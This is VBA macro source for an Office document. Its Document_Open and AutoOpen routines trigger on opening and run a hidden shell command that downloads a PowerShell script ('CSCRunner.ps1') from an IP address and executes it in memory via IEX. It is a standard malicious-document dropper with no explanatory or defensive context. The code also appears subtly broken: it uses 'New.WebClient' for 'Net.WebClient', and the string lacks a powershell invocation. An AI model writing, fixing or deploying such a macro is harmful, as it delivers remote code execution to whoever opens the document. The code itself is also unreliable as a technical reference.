Sub Document_Open      
    myMacro 
End Sub 


Sub AutoOpen   
    myMacro 
End Sub 


Sub myMacro 
    Dim str as String 

    str = "(New-Object New.WebClient).DownloadString('http://192.168.0.1/CSCRunner.ps1') | IEX"
    Shell str, vbHide

End Sub 
